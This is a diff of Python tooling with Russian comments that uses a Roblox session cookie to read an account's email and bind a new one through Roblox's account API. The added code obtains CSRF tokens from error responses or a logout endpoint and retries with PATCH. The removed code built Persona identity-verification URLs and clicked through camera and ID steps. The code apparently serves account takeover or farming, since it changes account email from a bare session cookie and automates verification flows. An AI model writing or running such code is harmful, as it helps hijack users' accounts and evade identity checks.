@@ -195,384 +195,103 @@ EMAIL_UPDATE_TEXTS = [
 ]
 
 def check_email_status(cookie):
-    """Проверяем привязана ли почта через API"""
+    """Проверяем привязана ли почта"""
     try:
         s = requests.Session()
         s.cookies[".ROBLOSECURITY"] = cookie
+        s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
         r = s.get("https://accountinformation.roblox.com/v1/email")
         if r.status_code == 200:
             data = r.json()
-            email = data.get("emailAddress", "")
-            verified = data.get("verified", False)
-            return email, verified
+            return data.get("emailAddress", ""), data.get("verified", False)
         return None, None
     except Exception:
         return None, None
 
+
 def link_email_playwright(cookie, email_addr):
-    """Привязываем почту через браузер"""
+    """Привязываем почту через API с правильным CSRF"""
     try:
-        with sync_playwright() as p:
-            browser = p.chromium.launch(headless=True)
-            ctx = browser.new_context(
-                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
-                viewport={"width": 1280, "height": 800}
-            )
-            ctx.add_cookies([{
-                "name": ".ROBLOSECURITY",
-                "value": cookie,
-                "domain": ".roblox.com",
-                "path": "/"
-            }])
-            page = ctx.new_page()
-            page.goto(
-                "https://www.roblox.com/my/account#!/info",
-                wait_until="networkidle",
-                timeout=30000
-            )
-            page.wait_for_timeout(3000)
+        s = requests.Session()
+        s.cookies[".ROBLOSECURITY"] = cookie
+        s.headers.update({
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json;charset=UTF-8",
+            "Origin": "https://www.roblox.com",
+            "Referer": "https://www.roblox.com/my/account#!/info",
+            "X-Requested-With": "XMLHttpRequest",
+        })
 
-            # Нажимаем Add или Update
-            all_btn = EMAIL_ADD_TEXTS + EMAIL_UPDATE_TEXTS
-            clicked = click_any_text(page, all_btn)
-            if not clicked:
-                browser.close()
-                return False, "Кнопка Add/Update не найдена на странице"
+        # Шаг 1: Первый запрос без CSRF — получаем токен из ответа 403
+        r1 = s.post(
+            "https://accountinformation.roblox.com/v1/email",
+            json={"emailAddress": email_addr}
+        )
+        logging.info("Email API step1: %d %s", r1.status_code, r1.text[:100])
 
-            logging.info("Email кнопка: " + str(clicked))
-            # Ждём появления модального окна
-            page.wait_for_timeout(3000)
-
-            # Ищем поле ввода email — расширенный список селекторов
-            input_found = False
-            selectors = [
-                "input[type='email']",
-                "input[name='emailAddress']",
-                "input[name='email']",
-                "input[placeholder*='email' i]",
-                "input[placeholder*='Email' i]",
-                "input[placeholder*='@']",
-                ".email-input input",
-                "[data-testid*='email'] input",
-                "[class*='email'] input",
-                "input[type='text']",
-                "input:visible",
-            ]
-
-            for sel in selectors:
-                try:
-                    page.wait_for_selector(sel, timeout=3000, state="visible")
-                    el = page.query_selector(sel)
-                    if el and el.is_visible():
-                        el.triple_click()
-                        el.fill(email_addr)
-                        logging.info("Email введён в: " + sel)
-                        input_found = True
-                        break
-                except Exception:
-                    continue
-
-            if not input_found:
-                # Последняя попытка через JavaScript
-                try:
-                    filled = page.evaluate("""(email) => {
-                        var inputs = document.querySelectorAll('input');
-                        for (var i = 0; i < inputs.length; i++) {
-                            var inp = inputs[i];
-                            if (inp.type === 'email' || inp.type === 'text') {
-                                inp.value = email;
-                                inp.dispatchEvent(new Event('input', {bubbles: true}));
-                                inp.dispatchEvent(new Event('change', {bubbles: true}));
-                                return true;
-                            }
-                        }
-                        return false;
-                    }""", email_addr)
-                    if filled:
-                        input_found = True
-                        logging.info("Email введён через JS")
-                except Exception:
-                    pass
-
-            if not input_found:
-                browser.close()
-                return False, "Поле email не найдено. Попробуй ещё раз"
-
-            page.wait_for_timeout(1000)
-
-            # Нажимаем Save
-            save_texts = [
-                "Save", "Submit", "Confirm", "Update", "Apply", "OK",
-                "Guardar", "Sauvegarder", "Speichern", "Salva",
-                "Сохранить", "Подтвердить", "Opslaan", "Zapisz",
-                "Kaydet", "Simpan", "保存", "保存する", "저장",
-            ]
-            saved = click_any_text(page, save_texts)
-            if saved:
-                logging.info("Save: " + str(saved))
-            else:
-                page.keyboard.press("Enter")
-                logging.info("Enter нажат")
-
-            page.wait_for_timeout(3000)
-            browser.close()
+        if r1.status_code == 200:
             return True, "OK"
+
+        # Берём CSRF из ответа 403
+        csrf = (r1.headers.get("x-csrf-token") or
+                r1.headers.get("X-CSRF-Token") or
+                r1.headers.get("X-Csrf-Token"))
+
+        if not csrf:
+            # Запасной вариант — logout endpoint
+            r0 = s.post("https://auth.roblox.com/v2/logout")
+            csrf = r0.headers.get("x-csrf-token")
+            logging.info("CSRF from logout: %s", csrf)
+
+        if not csrf:
+            return False, "Не удалось получить CSRF токен"
+
+        s.headers["x-csrf-token"] = csrf
+
+        # Шаг 2: Повторяем запрос с CSRF токеном
+        r2 = s.post(
+            "https://accountinformation.roblox.com/v1/email",
+            json={"emailAddress": email_addr}
+        )
+        logging.info("Email API step2: %d %s", r2.status_code, r2.text[:100])
+
+        if r2.status_code == 200:
+            return True, "OK"
+
+        # Пробуем PATCH если POST не работает
+        r3 = s.patch(
+            "https://accountinformation.roblox.com/v1/email",
+            json={"emailAddress": email_addr}
+        )
+        logging.info("Email API patch: %d %s", r3.status_code, r3.text[:100])
+
+        if r3.status_code == 200:
+            return True, "OK"
+
+        # Возвращаем понятную ошибку
+        resp_text = r2.text
+        try:
+            err = r2.json()
+            errors = err.get("errors", [])
+            if errors:
+                msg = errors[0].get("message", "")
+                code_err = errors[0].get("code", 0)
+                if code_err == 2:
+                    return False, "Email уже привязан к другому аккаунту"
+                elif code_err == 4:
+                    return False, "Неверный формат email"
+                elif code_err == 11:
+                    return False, "Аккаунт слишком молод для привязки email"
+                elif msg:
+                    return False, msg
+        except Exception:
+            pass
+        return False, "Ошибка сервера: " + resp_text[:100]
 
     except Exception as e:
         logging.error("Email error: %s", e)
         return False, str(e)
-
-
-def check_email_status(cookie):
-    """Проверяем привязана ли почта через API"""
-    try:
-        s = requests.Session()
-        s.cookies[".ROBLOSECURITY"] = cookie
-        r = s.get("https://accountinformation.roblox.com/v1/email")
-        if r.status_code == 200:
-            data = r.json()
-            email = data.get("emailAddress", "")
-            verified = data.get("verified", False)
-            return email, verified
-        return None, None
-    except Exception:
-        return None, None
-
-def link_email_playwright(cookie, email_addr):
-    """Привязываем почту через браузер — надёжнее API"""
-    try:
-        with sync_playwright() as p:
-            browser = p.chromium.launch(headless=True)
-            ctx = browser.new_context(
-                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
-                viewport={"width": 1280, "height": 800}
-            )
-            ctx.add_cookies([{
-                "name": ".ROBLOSECURITY",
-                "value": cookie,
-                "domain": ".roblox.com",
-                "path": "/"
-            }])
-            page = ctx.new_page()
-            page.goto(
-                "https://www.roblox.com/my/account#!/info",
-                wait_until="networkidle",
-                timeout=30000
-            )
-            page.wait_for_timeout(3000)
-
-            # Шаг 1: Нажимаем Add или Update
-            all_email_btn_texts = EMAIL_ADD_TEXTS + EMAIL_UPDATE_TEXTS
-            clicked = click_any_text(page, all_email_btn_texts)
-            if not clicked:
-                browser.close()
-                return False, "Кнопка Add/Update не найдена"
-
-            logging.info("Email кнопка нажата: " + str(clicked))
-            page.wait_for_timeout(2000)
-
-            # Шаг 2: Вводим email в поле ввода
-            input_selectors = [
-                "input[type='email']",
-                "input[placeholder*='email' i]",
-                "input[placeholder*='mail' i]",
-                "input[name='email' i]",
-                "input[type='text']",
-            ]
-            input_found = False
-            for sel in input_selectors:
-                try:
-                    el = page.wait_for_selector(sel, timeout=3000)
-                    if el:
-                        el.clear()
-                        el.type(email_addr, delay=50)
-                        input_found = True
-                        logging.info("Email введён в поле: " + sel)
-                        break
-                except Exception:
-                    continue
-
-            if not input_found:
-                browser.close()
-                return False, "Поле для email не найдено"
-
-            page.wait_for_timeout(1000)
-
-            # Шаг 3: Нажимаем Save / Submit
-            save_texts = [
-                "Save", "Submit", "Confirm", "OK", "Apply",
-                "Guardar", "Enviar", "Confirmar",
-                "Sauvegarder", "Soumettre", "Confirmer",
-                "Speichern", "Bestatigen",
-                "Salva", "Invia", "Conferma",
-                "Сохранить", "Подтвердить", "Отправить",
-                "Opslaan", "Bevestigen",
-                "Zapisz", "Zatwierdz",
-                "Kaydet", "Onayla",
-                "Simpan", "Kirim",
-                "保存", "确认", "提交",
-                "保存する", "確認",
-                "저장", "확인",
-            ]
-            saved = click_any_text(page, save_texts)
-            if saved:
-                logging.info("Save нажата: " + str(saved))
-            else:
-                # Пробуем нажать Enter
-                page.keyboard.press("Enter")
-                logging.info("Нажат Enter для отправки")
-
-            page.wait_for_timeout(3000)
-
-            # Шаг 4: Проверяем успех
-            email_now, _ = check_email_status(cookie)
-            browser.close()
-
-            if email_now and email_addr.lower() in email_now.lower():
-                return True, "OK"
-            elif email_now:
-                return True, "Почта может быть обновлена: " + email_now
-            return False, "Не удалось подтвердить привязку"
-
-    except Exception as e:
-        logging.error("Email Playwright error: %s", e)
-        return False, str(e)
-
-
-def build_url(data):
-    if not data:
-        return None
-    body = data.get("body", "")
-    links = data.get("links", [])
-    for item in links:
-        url = item.get("url", "")
-        if "withpersona.com" in url and len(url) > 40:
-            return url
-    inq = re.search(r'inq_[A-Za-z0-9]+', body)
-    tok = re.search(r'"sessionToken"\s*:\s*"([^"]{50,})"', body)
-    if not tok:
-        tok = re.search(r'"session[_-]?[Tt]oken"\s*:\s*"([^"]{50,})"', body)
-    if inq:
-        url = "https://inquiry.withpersona.com/verify?inquiry-id=" + inq.group(0)
-        if tok:
-            url += "&session-token=" + tok.group(1)
-        return url
-    return None
-
-
-# Все переводы кнопок Roblox на разных языках
-CAMERA_TEXTS = [
-    "Continue with camera",       # English
-    "Continuar con la camara",    # Spanish
-    "Continuar com camera",       # Portuguese
-    "Continuer avec la camera",   # French
-    "Mit Kamera fortfahren",      # German
-    "Continua con la fotocamera", # Italian
-    "Продолжить с камерой",       # Russian
-    "Doorgaan met camera",        # Dutch
-    "Kontynuuj z kamera",         # Polish
-    "Kamerayla devam et",         # Turkish
-    "Devam et kamera",            # Turkish alt
-    "Lanjutkan dengan kamera",    # Indonesian
-    "Tiep tuc voi camera",        # Vietnamese
-    "Magpatuloy sa camera",       # Filipino
-    "Devam kamera",               # Turkish short
-    "camera",                     # Fallback partial
-]
-
-ID_TEXTS = [
-    "Continue with ID",           # English
-    "Continuar con ID",           # Spanish
-    "Continuar com ID",           # Portuguese
-    "Continuer avec ID",          # French
-    "Mit Ausweis fortfahren",     # German
-    "Continua con ID",            # Italian
-    "Продолжить с удостоверением",# Russian
-    "Doorgaan met ID",            # Dutch
-    "Kontynuuj z dowodem",        # Polish
-    "Kimlikle devam et",          # Turkish
-    "Lanjutkan dengan ID",        # Indonesian
-    "Government ID",              # English alt
-    "ID document",                # English alt 2
-    "Continue with ID document",  # English full
-    "ID",                         # Fallback partial
-]
-
-# Кнопки Continue/Reset которые могут появиться после
-CONTINUE_TEXTS = [
-    "Continue", "Continuar", "Continuer", "Fortfahren",
-    "Continua", "Продолжить", "Doorgaan", "Kontynuuj",
-    "Devam et", "Lanjutkan", "Tiep tuc", "Magpatuloy",
-    "Next", "Siguiente", "Suivant", "Weiter", "Avanti",
-    "Далее", "Volgende", "Dalej",
-]
-
-RESET_TEXTS = [
-    # English
-    "Reset", "Start over", "Try again", "Restart",
-    # Spanish
-    "Restablecer", "Volver a intentar", "Reiniciar",
-    # Portuguese
-    "Redefinir", "Tentar novamente", "Recomecar",
-    # French
-    "Reinitialiser", "Recommencer", "Reessayer",
-    # German
-    "Zurucksetzen", "Neu starten", "Erneut versuchen",
-    # Italian
-    "Reimposta", "Ricomincia", "Riprova",
-    # Russian
-    "Сбросить", "Начать заново", "Попробовать снова",
-    # Dutch
-    "Opnieuw", "Opnieuw instellen", "Opnieuw proberen",
-    # Polish
-    "Zresetuj", "Zacznij od nowa", "Sprobuj ponownie",
-    # Turkish
-    "Sifirla", "Yeniden baslat", "Tekrar dene",
-    # Indonesian
-    "Atur ulang", "Mulai ulang", "Coba lagi",
-    # Japanese
-    "リセット", "やり直す",
-    # Korean
-    "재설정", "다시 시도",
-    # Chinese
-    "重置", "重新开始",
-]
-
-# Все тексты Continue на всех языках Roblox
-CONTINUE_TEXTS = [
-    # English
-    "Continue", "Next", "Proceed", "Go",
-    # Spanish
-    "Continuar", "Siguiente", "Proceder",
-    # Portuguese
-    "Continuar", "Proximo", "Prosseguir",
-    # French
-    "Continuer", "Suivant", "Proceder",
-    # German
-    "Weiter", "Fortfahren", "Naechste",
-    # Italian
-    "Continua", "Avanti", "Procedere",
-    # Russian
-    "Продолжить", "Далее", "Вперёд",
-    # Dutch
-    "Doorgaan", "Volgende", "Verder",
-    # Polish
-    "Kontynuuj", "Dalej", "Nastepny",
-    # Turkish
-    "Devam et", "Ileri", "Sonraki",
-    # Indonesian
-    "Lanjutkan", "Berikutnya", "Teruskan",
-    # Vietnamese
-    "Tiep tuc", "Tiep theo",
-    # Filipino
-    "Magpatuloy", "Susunod",
-    # Japanese
-    "続ける", "次へ",
-    # Korean
-    "계속", "다음",
-    # Chinese
-    "继续", "下一步",
-]
 
 
 def click_any_text(page, texts):
